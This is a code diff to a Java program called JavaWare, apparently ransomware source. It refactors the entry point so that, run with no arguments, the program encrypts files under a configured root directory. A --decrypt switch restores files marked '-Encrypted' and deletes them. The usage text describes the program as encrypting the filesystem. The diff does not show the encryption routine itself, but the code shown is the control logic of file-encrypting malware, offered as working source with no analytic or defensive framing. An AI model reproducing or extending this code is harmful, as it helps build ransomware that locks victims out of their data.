@@ -30,17 +30,16 @@ import java.util.*;
 
 public class JavaWare {
 
-    AES aes;
     List<String> avoidDir;
 
     public JavaWare() {
-        aes = new AES();
+
         avoidDir = new AvoidedDir().avoidDir;
     }
 
 
-    public void DecryptFiles() throws Exception {
-        String home = System.getProperty("user.home");
+    public void DecryptFiles(String path) throws Exception {
+        String home =  path; //System.getProperty("user.home");
         decryptionTraversal(home);
 
     }
@@ -58,32 +57,36 @@ public class JavaWare {
             } else {
                 String filename = f.getName();
                 if(filename.contains("-Encrypted")) {
-                    aes.decrypt(f);
+                    JwareUtils.getInstance().decrypt(f);
                     f.delete();
                 }
             }
         }
     }
 
-
-
-    public static void main(String[] args) throws Exception {
+    private static void app(String[] args) throws Exception {
         JavaWare jw = new JavaWare();
+        String root= Const.ROOT_DIR;
 
         if(args.length == 0) {
             //assume encrypt
             FindFiles ff = new FindFiles();
-            ff.FindFiles();
+            ff.FindFiles(root);
         } else if(args.length == 1) {
             if(args[0].equals("--encrypt")) {
                 FindFiles ff = new FindFiles();
-                ff.FindFiles();
+                ff.FindFiles(root);
             } else if(args[0].equals("--decrypt")) {
-                jw.DecryptFiles();
+                jw.DecryptFiles(root);
             } else {
                 System.out.println("Incorrect input, enter --encrypt to encrypt filesystem, or --decrypt to decrypt system.");
             }
         }
+    }
+
+
+    public static void main(String[] args) throws Exception {
+         app(args);
 
     }
 }
